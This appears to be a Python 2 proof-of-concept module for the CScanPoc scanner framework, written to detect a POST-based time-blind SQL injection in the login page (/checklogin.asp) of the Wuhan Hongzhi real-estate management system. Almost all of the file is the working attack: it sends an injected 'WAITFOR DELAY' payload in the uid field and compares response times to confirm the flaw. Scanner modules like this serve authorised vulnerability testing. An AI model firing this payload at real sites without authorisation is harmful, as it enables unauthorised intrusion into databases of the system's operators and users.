# coding: utf-8

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
import time

class Vuln(ABVuln):
    vuln_id = 'hongzhi_0003' # 平台漏洞编号，留空
    name = '武汉通用型房产系统存在POST型SQL注入漏洞'  # 漏洞名称
    level = VulnLevel.HIGH  # 漏洞危害级别
    type = VulnType.INJECTION # 漏洞类型
    disclosure_date = '2015-04-14'  # 漏洞公布时间
    desc = '''
    '''  # 漏洞描述
    ref = ''  # 漏洞来源
    cnvd_id = ''  # cnvd漏洞编号
    cve_id = ''  # cve编号
    product = '武汉弘智房产管理系统'  # 漏洞应用名称
    product_version = ''  # 漏洞应用版本

class Poc(ABPoc):
    poc_id = 'a857ba90-311a-4ebf-874d-97ebce827278'
    author = '47bwy'  # POC编写者
    create_date = '2018-05-11'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())

    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            
            #refer:http://www.wooyun.org/bugs/wooyun-2010-0107850
            hh = hackhttp.hackhttp()
            payload = '/checklogin.asp'
            postdata1 = 'uid=11111111&pwd=11111&imageField2.x=32&imageField2.y=7'
            postdata2 = 'uid=11111111%27%29%3BWAITFOR%20DELAY%20%270%3A0%3A5%27--&pwd=11111&imageField2.x=32&imageField2.y=7'
            url = self.target + payload 
            t1 = time.time()
            code1, head, res1, errcode1, _ = hh.http(url, postdata1)
            t2 = time.time()
            code2, head, res2, errcode2, _ = hh.http(url, postdata2)
            t3 = time.time()
            errtime = t3 - t2
            truetime = t2 - t1
            if errtime - truetime > 3:
                #security_hole(arg+payload)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))

        except Exception, e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()
